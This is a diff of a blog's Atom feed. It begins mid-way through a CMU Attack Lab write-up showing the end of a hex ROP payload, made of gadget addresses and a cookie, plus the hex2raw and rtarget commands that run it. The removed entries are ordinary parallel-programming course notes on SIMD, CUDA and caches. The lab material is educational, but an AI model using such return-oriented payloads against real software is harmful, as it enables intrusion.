class="number">00</span></span><br><span class="line"><span class="number">98</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line">c8 <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">68</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">48</span> <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">2</span>b <span class="number">1</span>a <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">6</span>e <span class="number">19</span> <span class="number">40</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br><span class="line"><span class="number">34</span> <span class="number">35</span> <span class="number">33</span> <span class="number">37</span> <span class="number">34</span> <span class="number">66</span> <span class="number">65</span> <span class="number">65</span></span><br><span class="line"><span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span></span><br></pre></td></tr></table></figure>
+<p>然后转换成机器码 <code>./hex2raw &lt; p5.txt &gt; p5r.txt</code>，再执行一次 <code>./rtarget -i p5r.txt</code>，就可以看到结果了：</p>
+<p><img src="/images/14554895097953.jpg" alt=""></p>
+<h2 id="u603B_u7ED3"><a href="#u603B_u7ED3" class="headerlink" title="总结"></a>总结</h2><p>这次作业的两个部分，有不同的难点。利用缓冲区溢出跳转到栈中并在栈中执行代码虽然需要的步骤多一些，但是调试还是比较方便的，可以走一步看一步，根据具体的内存分布来进行处理，就是第三阶段的随机部分可能需要多试几次才能找到正确的存放位置。</p>
+<p>ROP 的部分，因为跳转来跳转去，难点在于思路，有了一个大概的思路，就可以利用已有的代码跳来跳去来『凑』出最终的结果了。最后部分需要考虑到偏移量的问题，需要对 <code>%rsp</code> 具体所指向的内存位置有比较清晰地了解，这里我有点犯迷糊，在同学的帮助下才找到了问题所在。不同的字长和位数也有影响，虽然大概的意思差不多，不过我看前一两年的作业中的汇编代码，就和现在的汇编代码有挺大的差异了。</p>
+<p>越接近硬件层面，越容不得丝毫差池，越来越多的数值和偏移都变得和机器相关，才更加意识到现在能写几乎与机器无关的代码是多么幸福。不过也不能因为前人的工作就忽略不同机器的差异，还是要多考虑不同的层面，才能写出让更多机器能跑得更快的代码。</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>这次的作业中，我们将要亲自上手利用漏洞来进行代码注入的攻击，听起来很刺激不是吗？</p>]]>
+    
+    </summary>
+    
+      <category term="Attacklab" scheme="http://wdxtub.com/tags/Attacklab/"/>
+    
+      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
+    
+      <category term="习题课" scheme="http://wdxtub.com/tags/%E4%B9%A0%E9%A2%98%E8%AF%BE/"/>
+    
+      <category term="计算机" scheme="http://wdxtub.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
+    
+      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[第五周 - Conqueror]]></title>
@@ -2389,1265 +2694,6 @@ host www.sina.com.cn
       <category term="OpenMP" scheme="http://wdxtub.com/tags/OpenMP/"/>
     
       <category term="并行" scheme="http://wdxtub.com/tags/%E5%B9%B6%E8%A1%8C/"/>
-    
-      <category term="编程" scheme="http://wdxtub.com/tags/%E7%BC%96%E7%A8%8B/"/>
-    
-      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[How to Write Fast Code 第 1 课 背景知识]]></title>
-    <link href="http://wdxtub.com/2016/02/01/fastcode-1/"/>
-    <id>http://wdxtub.com/2016/02/01/fastcode-1/</id>
-    <published>2016-02-01T14:51:22.000Z</published>
-    <updated>2016-02-01T17:00:07.000Z</updated>
-    <content type="html"><![CDATA[<p>这一课主要介绍并行编程的背景知识和一些基本的技巧，给大家一个整体的认知。</p>
-<a id="more"></a>
-<hr>
-<p>简单来说，提高程序运行速度的方式有很多种，除了算法优化，还有其他许多软件硬件相结合的技巧。不同层级上的优化，带来的收益也会不一样，比方说在软件架构上的优化，可能可以带来 20-100 倍的收益，算法层面上的优化是 10-40 倍，而数据结构上的优化是 1.5-8 倍（当然这些数字都不是绝对的）</p>
-<p>这门课主要涉及 OpenMP，CUDA 和 Hadoop（也会有一些 Spark 的内容，机器学习的部分还在商量中）。我主要负责 OpenMP 和 Hadoop 的部分。</p>
-<p>具体需要理解的概念，基本上在第 0 课中我的笔记都有涉及，课件里的例子一定要重点掌握，比如：</p>
-<ul>
-<li>Instruction level parallelism 的原理和机制</li>
-<li>SIMD 的原理和机制（SSE 的用法）</li>
-<li>Simultaneous Multithreading(SMT)的概念</li>
-<li>Memory Hierarchy 的原理及如何进行利用（矩阵相乘的例子）</li>
-<li>Compulsory miss / Capacity / Conflict</li>
-</ul>
-<p>接着是两幅图：Platform + Technique</p>
-<p><img src="/images/14543452357180.jpg" alt=""></p>
-<p><img src="/images/14543452584935.jpg" alt=""></p>
-<p>最后说一下 Kmeans 这个算法，具体的算法过程这里不赘述了，基本的过程参见下图：</p>
-<p><img src="/images/14543458160793.jpg" alt=""></p>
-<p>如果想要理解更清楚一些，还需要去看看 EM 算法（这里同样不写）。然后对应到具体的代码，看看有哪些地方可以并行，哪些地方不行，如何根据不同的策略来优化代码。这些会在之后的习题课进行详细一点的讲解。</p>
-]]></content>
-    <summary type="html">
-    <![CDATA[<p>这一课主要介绍并行编程的背景知识和一些基本的技巧，给大家一个整体的认知。</p>]]>
-    
-    </summary>
-    
-      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
-    
-      <category term="并行" scheme="http://wdxtub.com/tags/%E5%B9%B6%E8%A1%8C/"/>
-    
-      <category term="架构" scheme="http://wdxtub.com/tags/%E6%9E%B6%E6%9E%84/"/>
-    
-      <category term="编程" scheme="http://wdxtub.com/tags/%E7%BC%96%E7%A8%8B/"/>
-    
-      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
-    
-  </entry>
-  
-  <entry>
-    <title><![CDATA[How to Write Fast Code 第 0 课 往年笔记与问题集]]></title>
-    <link href="http://wdxtub.com/2016/02/01/fastcode-0/"/>
-    <id>http://wdxtub.com/2016/02/01/fastcode-0/</id>
-    <published>2016-02-01T14:51:17.000Z</published>
-    <updated>2016-02-01T15:19:50.000Z</updated>
-    <content type="html"><![CDATA[<p>本来打算借着当助教，看看这门课有没有什么变化。事实上，没啥变化，所以这里先把当时我的笔记放出来，之后的课程可能会主要集中于代码和项目的思路分析，具体理论的东西不会再重复太多。</p>
-<a id="more"></a>
-<hr>
-<h1 id="Lecture_Note"><a href="#Lecture_Note" class="headerlink" title="Lecture Note"></a>Lecture Note</h1><ul>
-<li>Fast Platforms (Multicore platforms, Manycore platforms, Cloud platform) + Good Techniques (Data structure, Algorithm, Software Architecture)</li>
-<li>Need is driven by the applications, NOT by the availability of the platform.</li>
-<li>Background -&gt; Multicore(openmp) -&gt; Manycore(CUDA) -&gt; cluster(Hadoop) -&gt; Special Topics</li>
-</ul>
-<h2 id="Multicore_vs_Manycore"><a href="#Multicore_vs_Manycore" class="headerlink" title="Multicore vs Manycore"></a>Multicore vs Manycore</h2><ul>
-<li>Multicore: yoke of oxen. Each core optimized for executing a single thread.</li>
-<li>Manycore: flock of chickens. Cores optimized for aggregate throughput, deemphasizing individual performance.</li>
-</ul>
-<h2 id="Instruction_Level_Parallelism__28ILP_29"><a href="#Instruction_Level_Parallelism__28ILP_29" class="headerlink" title="Instruction Level Parallelism (ILP)"></a>Instruction Level Parallelism (ILP)</h2><p>Instructions in a sequence that can be computed at the same time.</p>
-<ul>
-<li>Advantages<ul>
-<li>No changes in sequential software necessary</li>
-</ul>
-</li>
-<li>Disadvantages<ul>
-<li>Significantly more complex processor architecture</li>
-<li>Longer to design the processor</li>
-<li>Longer to verify the correctness of the processor design</li>
-<li>Consumes more energy than simple in-order processor</li>
-</ul>
-</li>
-</ul>
-<h2 id="Out-of-order_Pipelines"><a href="#Out-of-order_Pipelines" class="headerlink" title="Out-of-order Pipelines"></a>Out-of-order Pipelines</h2><p>Allows instruction re-ordering, register-renaming</p>
-<h2 id="SIMD"><a href="#SIMD" class="headerlink" title="SIMD"></a>SIMD</h2><ul>
-<li>can be area and power efficient</li>
-<li>parallelism exposed to programmer &amp; compiler</li>
-</ul>
-<p>Locality, Temporal Locality, Spatial Locality</p>
-<p>Compulsory misses, Capacity misses, Conflict misses</p>
-<ul>
-<li>Advantages<ul>
-<li>Power-efficient wya to improve instruction throughput</li>
-<li>Exploitable in many compute-intensive applications</li>
-</ul>
-</li>
-<li>Disadvantages<ul>
-<li>Explicit representation in vector instructions</li>
-<li>Software requires re-compilation to take advantage of new SIMD capabilites.</li>
-<li>May require hand-tuning to expoit full benefit</li>
-</ul>
-</li>
-</ul>
-<h2 id="Simultaneous_multithreading"><a href="#Simultaneous_multithreading" class="headerlink" title="Simultaneous multithreading"></a>Simultaneous multithreading</h2><p>Capturing the opportunity to run faster when more than one thread of instructions are available.</p>
-<ul>
-<li>Advantages<ul>
-<li>Gain power-efficiency by increase processor pipeline utilization</li>
-</ul>
-</li>
-<li>Disadvantages<ul>
-<li>Requires multiple threads available</li>
-<li>May trigger confilicts in shared cache during execution</li>
-<li>Does not improve latency of each thread</li>
-</ul>
-</li>
-</ul>
-<h2 id="Concurrency_vs_Parallelism"><a href="#Concurrency_vs_Parallelism" class="headerlink" title="Concurrency vs Parallelism"></a>Concurrency vs Parallelism</h2><ul>
-<li>Concurrency: We expose concurrency in our application</li>
-<li>Parallelism: We exploit parallelism in our platform</li>
-</ul>
-<p>Concurrency: A sequence of instructions executes concurrently if they execute independent of each other as if they were executed at the same time.</p>
-<ul>
-<li>They do not need to be executed truly at the same time though.</li>
-<li>On a single processor computer, multi-tasking systems execute programs concurrently by interleaving their operations such that they appear to execute at the same time.</li>
-</ul>
-<p>Parallelism: Instruction streams that execute in parallel actually execute at the same time</p>
-<ul>
-<li>Parallelism allows multiple instructions to be executed at the exact same time</li>
-<li>Parallelism requires multiple processing units, ranging from small pipeline stages up through multithreaded architectures and multicore and multiprocessing systems</li>
-</ul>
-<p>Difference</p>
-<ul>
-<li>Time</li>
-<li>In concurrency, at any given time, a single operation is occurring.<ul>
-<li>High clock rates and clever interleaving can give the illusion of parallelism</li>
-<li>All modern desktop/server OS give you this. Embedded, maybe not.</li>
-</ul>
-</li>
-<li>In parallelism, at a given point in time, multiple operations are occurring.<ul>
-<li>This is important to distinguish. Parallelism means it is extremely difficult (often impossible) to predict the interleaving of instructions.</li>
-</ul>
-</li>
-</ul>
-<h2 id="The_process_of_problem_solving_3A"><a href="#The_process_of_problem_solving_3A" class="headerlink" title="The process of problem solving:"></a>The process of problem solving:</h2><ul>
-<li>Understand the current state<ul>
-<li>Running on a platform</li>
-<li>Using a specific set of resources</li>
-<li>Achieving a specific performance</li>
-<li>Meeting a specific criteria/requirement</li>
-</ul>
-</li>
-<li>Observe the internal representation<ul>
-<li>Application structure</li>
-<li>Implementation concerns<ul>
-<li>Task considerations</li>
-<li>Data representations</li>
-<li>concurrency opportunities</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Search among alternatives</li>
-<li>Select from a set of choices</li>
-</ul>
-<h2 id="Kmeans_Problem"><a href="#Kmeans_Problem" class="headerlink" title="Kmeans Problem"></a>Kmeans Problem</h2><ul>
-<li>Find K cluster centers that minimize the distance from each data point to a cluster center (centroid)</li>
-<li>Important algorithm in machine learning</li>
-<li>NP-hard for arbitrary input</li>
-<li>Issues<ul>
-<li>Worst case running time is super-polynomial</li>
-<li>Approximation can be arbitrarily bad</li>
-</ul>
-</li>
-</ul>
-<h2 id="How_to_write_fast_code"><a href="#How_to_write_fast_code" class="headerlink" title="How to write fast code"></a>How to write fast code</h2><ul>
-<li><strong>Expose</strong> concurrencies in applications and algorithms</li>
-<li><strong>Exploit</strong> parallelisms on application platform</li>
-<li><strong>Explore</strong> mapping between concurrency and parallelism</li>
-</ul>
-<h2 id="The_phases_28kmeans_29"><a href="#The_phases_28kmeans_29" class="headerlink" title="The phases(kmeans)"></a>The phases(kmeans)</h2><ul>
-<li>Initialization: Randomly select k cluster centers<ul>
-<li>Select k samples from data as initial centers [Forgy Partition]</li>
-</ul>
-</li>
-<li>Expectation: Assign each data point go closest center<ul>
-<li>Compare each data point (N) to each cluster center (K)</li>
-<li>Distance Metric: Euclidean distance (D dimensions)</li>
-</ul>
-</li>
-<li>Maximization: Update centers based on assignments</li>
-<li>Evaluate: Re-iterate steps 2-3 until convergence or stopping criteria.</li>
-</ul>
-<h2 id="Performance_Analysis_3A_Roofline_Model"><a href="#Performance_Analysis_3A_Roofline_Model" class="headerlink" title="Performance Analysis: Roofline Model"></a>Performance Analysis: Roofline Model</h2><ul>
-<li>Observe the phases of execution</li>
-<li>Characterize the execution time break downs</li>
-<li>Reason about why a piece of code is slow</li>
-<li>Identify performance bottleneck</li>
-</ul>
-<h2 id="How_to_evaluate_a_mapping"><a href="#How_to_evaluate_a_mapping" class="headerlink" title="How to evaluate a mapping"></a>How to evaluate a mapping</h2><ul>
-<li>Efficiency: Runs quickly, makes good use of computational resources</li>
-<li>Simplicity: Easy to understand code is easier to develop, debug, verify and modify</li>
-<li>Portability: Should run on widest range of parallel computers</li>
-<li>Scalability: Should be effective on a wide range of processing elements</li>
-</ul>
-<h2 id="Exploiting_Different_Levels_of_Parallelism"><a href="#Exploiting_Different_Levels_of_Parallelism" class="headerlink" title="Exploiting Different Levels of Parallelism"></a>Exploiting Different Levels of Parallelism</h2><ul>
-<li>SIMD-Level: using vectorizing compiler and hand-code intrinsics</li>
-<li>SMT-Level: OS abstract it to core-level parallelism</li>
-<li>Core-Level: Using threads to describe work done on different cores</li>
-</ul>
-<h2 id="False_Sharing"><a href="#False_Sharing" class="headerlink" title="False Sharing"></a>False Sharing</h2><ul>
-<li>Cache loads and stores work with 4-16 word long cache lines(64B for Intel)<ul>
-<li>If two threads are wrting to the same cache line, conflicts occurs</li>
-</ul>
-</li>
-<li>Even if the address differs, one will still suffer performance penalty</li>
-</ul>
-<h2 id="Optimization_Categorization"><a href="#Optimization_Categorization" class="headerlink" title="Optimization Categorization"></a>Optimization Categorization</h2><ul>
-<li>Maximizing In-core Performance<ul>
-<li>Exploit in-core parallelism (reorder, unroll, SIMD, eliminate branch)</li>
-</ul>
-</li>
-<li>Maximizing Memory Bandwidth<ul>
-<li>Exploit NUMA, Hide memory latency (unit-stride streams, memory affinity, sw prefetch, DMA Lists, TLB Blocking)</li>
-</ul>
-</li>
-<li>Minimizing Memory Traffic<ul>
-<li>Eliminate Capacity/Conflict/Compulsory misses (cache blocking, array padding, compress data, streaming stores)</li>
-</ul>
-</li>
-</ul>
-<h2 id="Measuring_Arithmetic_Intensity"><a href="#Measuring_Arithmetic_Intensity" class="headerlink" title="Measuring Arithmetic Intensity"></a>Measuring Arithmetic Intensity</h2><p>Arithmetic Intensity = (# of FP Operations to run the program) / (# of Bytes Accessed in the Main Memory)</p>
-<p>Arithmetic Intensity = FLOPs / (Allocations + Compulsory + Conflict + Capacity)</p>
-<h2 id="Roofline_Model"><a href="#Roofline_Model" class="headerlink" title="Roofline Model"></a>Roofline Model</h2><p>Attainable Performance(ij) = min(FLOP/s with Optimization(1-i), AI*Bandwidth with Optimization(1-j)</p>
-<p>Plot on log-log scale</p>
-<p>Lantency -&gt; Runtime</p>
-<p>Throughput -&gt; Performance</p>
-<ul>
-<li>Throughput<ul>
-<li>Usually measured in floating point operations per second(FLOPS)</li>
-<li>Floating point operations = addition + multiplication</li>
-</ul>
-</li>
-</ul>
-<p>Higher Performance != Shorter Runtime</p>
-<p>True Arithmetic Intensity (AI) ~ Total Flops / Total DRAM Bytes</p>
-<ul>
-<li>Arithmetic intensity is ultimately limited by compulsory traffic</li>
-<li>Arithmetic intensity is diminished by conflict or capacity misses</li>
-</ul>
-<h2 id="Data_3A_Three_Classes_of_Locality"><a href="#Data_3A_Three_Classes_of_Locality" class="headerlink" title="Data: Three Classes of Locality"></a>Data: Three Classes of Locality</h2><ul>
-<li>Spatial Locality<ul>
-<li>data is transferred from cache to registers in words</li>
-<li>However, data is transferred to the cache in 64-128 Byte lines</li>
-<li>using every word in a line maximizes spatial locality</li>
-<li>transform data structures into struct of arrays(SoA) layout</li>
-</ul>
-</li>
-<li>Temporal Locality<ul>
-<li>reusing data(either registers or cachelines) multiple times</li>
-<li>amortizes the impact of limited bandwidth</li>
-<li>transform loop s or algorithms to maximize reuese.</li>
-</ul>
-</li>
-<li>Sequential Locality<ul>
-<li>Many memory address patterns access cache lines sequentially</li>
-<li>CPU’s hardware stream prefetchers exploit this observation to hide speculatively load data to memory lantency</li>
-<li>Tansform loops to generate long, unit-stride accesses</li>
-</ul>
-</li>
-</ul>
-<h2 id="GPU_is_an_Accelerator"><a href="#GPU_is_an_Accelerator" class="headerlink" title="GPU is an Accelerator"></a>GPU is an Accelerator</h2><ul>
-<li>Host System (CPU) &lt;—&gt; Device System (GPU)</li>
-<li>When Does Using GPU Make Sense?<ul>
-<li>Application with a lot of concurrency (1000-way, fine-grained concurrency)</li>
-<li>Some memory intensive applications (Aggregate memory bandwidth is higher)</li>
-<li>Advantage diminishes when task granularity becomes too large to fit in shared memory</li>
-</ul>
-</li>
-</ul>
-<h2 id="GPU_Programming_Model_3A_Stream"><a href="#GPU_Programming_Model_3A_Stream" class="headerlink" title="GPU Programming Model: Stream"></a>GPU Programming Model: Stream</h2><ul>
-<li>Stream -&gt; kernel -&gt; stream</li>
-<li>Streams: An array of data units</li>
-<li>Kernels<ul>
-<li>Take streams as input, produce streams at output</li>
-<li>Perform computation on streams</li>
-<li>Kernels can be linked together</li>
-</ul>
-</li>
-</ul>
-<h2 id="CUDA_3A_Compute_Unified_Device_Architecture"><a href="#CUDA_3A_Compute_Unified_Device_Architecture" class="headerlink" title="CUDA: Compute Unified Device Architecture"></a>CUDA: Compute Unified Device Architecture</h2><ul>
-<li>Integrated host + device app C program</li>
-<li>Serial or modestly parallel parts in host C code</li>
-<li>Highly Parallel parts in device SPMP kernel C code</li>
-</ul>
-<h2 id="CUDA_Programming_Model"><a href="#CUDA_Programming_Model" class="headerlink" title="CUDA Programming Model"></a>CUDA Programming Model</h2><ul>
-<li>Executing kernel functions within threads</li>
-<li>Threads organization<ul>
-<li>Blocks and Grids</li>
-</ul>
-</li>
-<li>Hardware mapping of threads<ul>
-<li>Computation-to-core mapping<ul>
-<li>Thread -&gt; Core</li>
-<li>Thread blocks -&gt; Multi-processors</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Thread organization<ul>
-<li>an array of threads -&gt; block</li>
-<li>an array of blocks -&gt; grid</li>
-</ul>
-</li>
-<li>All threads in one grid execute the same kernel</li>
-<li>Grids are executed sequentially</li>
-<li>Thread Cooperation<ul>
-<li>Threads within a block<ul>
-<li>Shared memory</li>
-<li>Atomic operation on Share memory &amp; global memory</li>
-<li>Barrier</li>
-</ul>
-</li>
-<li>Threads between blocks<ul>
-<li>Atomic operation on global memory</li>
-</ul>
-</li>
-<li>Threads between grids<ul>
-<li>NO WAY!</li>
-</ul>
-</li>
-</ul>
-</li>
-<li>Thread Mapping and Scheduling<ul>
-<li>A grid of threads takes over the whole device</li>
-<li>A block of threads is mapped on one multi-processor<ul>
-<li>A multi-processor can take more than one blocks.(Occupancy)</li>
-<li>A block can not be preempted until finish</li>
-</ul>
-</li>
-<li>Threads within a blocks are shceduled to run on multi-processors</li>
-<li>Threads are grouped into warps(32) as scheduling units</li>
-</ul>
-</li>
-<li>Parallel Memory Sharing<ul>
-<li>Local Memory: per-thread</li>
-<li>Shared Memory: per-Block</li>
-<li>Global Memory: per-application</li>
-</ul>
-</li>
-<li>Shared Memory<ul>
-<li>Each Multi-processor has 32KB of Shared Memory - 32 banks of 32bit words</li>
-<li>Visible to all threads in a thread block</li>
-</ul>
-</li>
-</ul>
-<h2 id="Why_Warps"><a href="#Why_Warps" class="headerlink" title="Why Warps"></a>Why Warps</h2><p>Each Fermi core can maintain 48 warps of architecural context.</p>
-<p>Each warp manages a 32-wide SIMD vector worth of computation</p>
-<p>With ~20 registers for each trhead:</p>
-<p>4(Bytes/register) x 20(Registers) x 32(SIMD lanes) x 48 (Warps) = 128KB per core x 16 (core) = 2MB total of register files</p>
-<ul>
-<li>Software abstract info hid an extra level of architecture complexity</li>
-<li>A 128KB register file is a large memory (takes more than one cycle)</li>
-<li>Hardware provide 160wide physical SIMD units, half-pump register files</li>
-<li>To simplify the programming model</li>
-</ul>
-<h2 id="How_to_Deal_with_GPUs_of_Different_Sizes_3F"><a href="#How_to_Deal_with_GPUs_of_Different_Sizes_3F" class="headerlink" title="How to Deal with GPUs of Different Sizes?"></a>How to Deal with GPUs of Different Sizes?</h2><ul>
-<li>CUDA provides an abstract infor concurrency to be fully exposed</li>
-<li>HW/Runtime provides capability to schedule the computation</li>
-</ul>
-<h2 id="Thread_Blocks"><a href="#Thread_Blocks" class="headerlink" title="Thread Blocks"></a>Thread Blocks</h2><ul>
-<li>Computation is grouped into blocks of independent concurrently execrable work</li>
-<li>Fully exposed the concurrency in the application</li>
-<li>The HW/Runtime makes the decision to selectively sequentialize the execution as necessary</li>
-</ul>
-<h2 id="21_21_Threads"><a href="#21_21_Threads" class="headerlink" title="!! Threads"></a>!! Threads</h2><ul>
-<li>Threads are the computation performed in each SIMD lane in a core<ul>
-<li>CUDA provides a SIMT programming abstraction to assist users</li>
-</ul>
-</li>
-<li>SIMT: Single Instruction Multiple Threads<ul>
-<li>A single instruction multiple processing elements</li>
-<li>Different from SIMD</li>
-<li>SIMT abstract the # threads in a thread block as a user-specified parameter</li>
-</ul>
-</li>
-<li>SIMT enables programmers to write thread-level parallel code for<ul>
-<li>Independent, Scalar threads</li>
-<li>Data-parallel code fro coordinated threads</li>
-</ul>
-</li>
-<li>For function correctness, programmers can ignore SIMT behavior</li>
-<li>For performance, programmer can tune applications with SIMT in mind</li>
-</ul>
-<h2 id="About_Data"><a href="#About_Data" class="headerlink" title="About Data"></a>About Data</h2><ul>
-<li>SIMD style programming can be very restrictive for communication between SIMD lanes.</li>
-<li>On the same chip, in the same core, computations in SMD lanes (physically) takes places very close to each other</li>
-</ul>
-<h2 id="Shared_Memory/L1_cache"><a href="#Shared_Memory/L1_cache" class="headerlink" title="Shared Memory/L1 cache"></a>Shared Memory/L1 cache</h2><ul>
-<li>Manycore processors provide memory local to each core</li>
-<li>Computations in SIMD-lanes in the same core can communicate via memory read / write</li>
-<li>Two types of memory:<ul>
-<li>Programmer-managed scratch pad memory</li>
-<li>HW-managed L1 cache</li>
-</ul>
-</li>
-<li>For NVIDIA Fermi architecture, you get 64KB per core with 2 configurations:<ul>
-<li>48KB scratch pad (Shared Memory), 16KB L1 cache</li>
-<li>16KB scratch pad (Shared Memory), 48KB L1 cache</li>
-</ul>
-</li>
-<li>How many Threads per Thread Block<ul>
-<li>In Fermi, 48 warps of context are maintained per core</li>
-<li>In Fermi, each thread block can have up to 1024 threads</li>
-</ul>
-</li>
-</ul>
-<h2 id="Synchronization"><a href="#Synchronization" class="headerlink" title="Synchronization"></a>Synchronization</h2><ul>
-<li><code>__syncthreads()</code><ul>
-<li>waits until all threads in the thread block have reached this point and all global and shared memory accesses made by these threads prior to <code>__syncthreads()</code> are visible to all threads in the block</li>
-<li>used to coordinate communication between the threads of the same block</li>
-</ul>
-</li>
-</ul>
-<h2 id="Compilation"><a href="#Compilation" class="headerlink" title="Compilation"></a>Compilation</h2><ul>
-<li>Any source file containing CUDA language extensions must be compiled with NVCC<ul>
-<li>NVCC is a compiler driver</li>
-<li>Works by invoking all the necessary tools and compilers like cudacc, g++, …</li>
-</ul>
-</li>
-<li>NVCC outputs<ul>
-<li>C code (host CPU code)<ul>
-<li>Must be compiled with the rest of the application using another tool</li>
-</ul>
-</li>
-<li>PTX<ul>
-<li>object code directly</li>
-<li>or, PTX source, interpreted at runtime</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<h2 id="SOA_vs_AOS"><a href="#SOA_vs_AOS" class="headerlink" title="SOA vs AOS"></a>SOA vs AOS</h2><p>Struct of Arrays: 一共只有一个 struct</p>
-<pre><code>typedef struct
-{
-    float* x;
-    float* y;
-    float* z;
-} Constraints;
-</code></pre><p>x | x | x | y | y | y | z | z | z</p>
-<p>Array of Struct</p>
-<pre><code>typedef struct __align__(16)
-{
-    float3 position;
-} Constraint;
-</code></pre><p>x | y | z | x | y | z | x | y | z</p>
-<p>It depends on the usage of the data.</p>
-<p>Note that AoS pads within each struct. While SoA pads between the arrays.</p>
-<p>These have the following trade-offs:</p>
-<ol>
-<li>AoS tends to be more readable to the programmer as each “object” is kept together.</li>
-<li>AoS may have better cache locality if all the members of the struct are accessed together.</li>
-<li>SoA could potentially be more efficient since grouping same datatypes together sometimes exposes vectorization.</li>
-<li>In many cases SoA uses less memory because padding is only between arrays rather than between every struct.</li>
-</ol>
-<h2 id="Optimization_Strategies"><a href="#Optimization_Strategies" class="headerlink" title="Optimization Strategies"></a>Optimization Strategies</h2><ul>
-<li>Global Memory Access Pattern -&gt; Coalescing</li>
-<li>Control Flow -&gt; Divergent branch</li>
-</ul>
-<h2 id="Memory_Coalescing"><a href="#Memory_Coalescing" class="headerlink" title="Memory Coalescing"></a>Memory Coalescing</h2><ul>
-<li>Hardware Constraint: DRAM is accessed in ‘segments’ of 32B/64B/128B</li>
-<li>Goal: combine multiple memory accesses generated from multiple threads into a single physical transaction</li>
-<li>Rules for maximizing DRAM memory bandwidth:<ul>
-<li>Possible bus transaction sizes: 32B, 64B, or 128B</li>
-<li>Memory segment must be aligned: First address = multiple of segment</li>
-<li>Hardware coalescing fro each half-warp: 16-word wide</li>
-</ul>
-</li>
-</ul>
-<p>Threads can access any words in any order, including the same words, and a single memory transaction for each segment addressed by a half-warp.</p>
-<p>核心想法就是一次载入，尽量多次使用，减少访问次数。</p>
-<h2 id="Use_of_Shared_Memory"><a href="#Use_of_Shared_Memory" class="headerlink" title="Use of Shared Memory"></a>Use of Shared Memory</h2><ul>
-<li>Process:<ul>
-<li>Load from DRAM to shared memory</li>
-<li>Synchronize</li>
-<li>Perform work on data in shared memory</li>
-<li>Synchronize</li>
-<li>Write out results to DRAM</li>
-</ul>
-</li>
-</ul>
-<p>Trick: Double Buffering</p>
-<p>先载入到 global memory 再折腾到 shared memory</p>
-<p>Declared a fixed sized variable at compile time</p>
-<pre><code>__shared__ float As[BLOCK_SIZE][BLOCK_SIZE];
-</code></pre><p>Define a size to be used at run time</p>
-<pre><code>mykernel &lt;&lt;&lt;nBloks, nThds, shmemByteSize&gt;&gt;&gt;(a, objects);
-在 kernel 函数中也需要进一步处理
-</code></pre><h2 id="Memory_Bank_Conflicts"><a href="#Memory_Bank_Conflicts" class="headerlink" title="Memory Bank Conflicts"></a>Memory Bank Conflicts</h2><ul>
-<li>Shared memory has 32 banks<ul>
-<li>Organized such that successive 32-bit words are assigned to successive banks</li>
-<li>Each bank has a bandwidth of 32 bits per two clock cycles (2 cycle latency)</li>
-</ul>
-</li>
-</ul>
-<p>A bank conflict occurs if two or more threads access any bytes within different 32-bit words belonging to the same bank.</p>
-<p>如果访问的是同一个 bank 的同一个数据，那么多少个线程一起访问也不 conflict</p>
-<h2 id="Padding_Technique"><a href="#Padding_Technique" class="headerlink" title="Padding Technique"></a>Padding Technique</h2><p>矩阵的那个如果不是整数可以考虑 padding</p>
-<h2 id="Branch_divergence"><a href="#Branch_divergence" class="headerlink" title="Branch divergence"></a>Branch divergence</h2><p>Optimization: Factor out decision variables to have shorter sequence of divergent code</p>
-<p>Branch divergence occurs only within a warp</p>
-<h2 id="Optimizing_Instruction_Mix"><a href="#Optimizing_Instruction_Mix" class="headerlink" title="Optimizing Instruction Mix"></a>Optimizing Instruction Mix</h2><ul>
-<li>Compiler Assisted Loop Unrolling<ul>
-<li>Provides more instruction level parallelism for the compiler to use</li>
-<li>Improves the ability for the compiler to find the instruction mix that instructions executed per cycle(IPC)</li>
-</ul>
-</li>
-<li>By default, the compiler unrolls small loops with a know trip count</li>
-<li>In CUDA, <code>#pragma unroll</code> directive can control unrolling of any given loop<ul>
-<li>Must be placed immediately before the loop and only applies to that loop</li>
-<li>Optionally followed by a number</li>
-</ul>
-</li>
-</ul>
-<h3 id="Device-only_CUDA_intrinsic_function"><a href="#Device-only_CUDA_intrinsic_function" class="headerlink" title="Device-only CUDA intrinsic function"></a>Device-only CUDA intrinsic function</h3><p>常用的数学计算有 gpu 版本替代</p>
-<h2 id="Data_Parallel_Algorithms_-_Map"><a href="#Data_Parallel_Algorithms_-_Map" class="headerlink" title="Data Parallel Algorithms - Map"></a>Data Parallel Algorithms - Map</h2><p>Map: A fucntion that applies a given function to each element of a list , and returning a list of results</p>
-<p>Two important properties:</p>
-<ul>
-<li>Side-effect free: Only returning a value, no modifications of state with the rest of the application</li>
-<li>Independent: Has an independent piece of work, where its input does not depend on another function</li>
-</ul>
-<h2 id="Data_Parallel_Algorithm_-_Reduce"><a href="#Data_Parallel_Algorithm_-_Reduce" class="headerlink" title="Data Parallel Algorithm - Reduce"></a>Data Parallel Algorithm - Reduce</h2><p>Reduce: A function that takes in a list of objects and builds up a return value.</p>
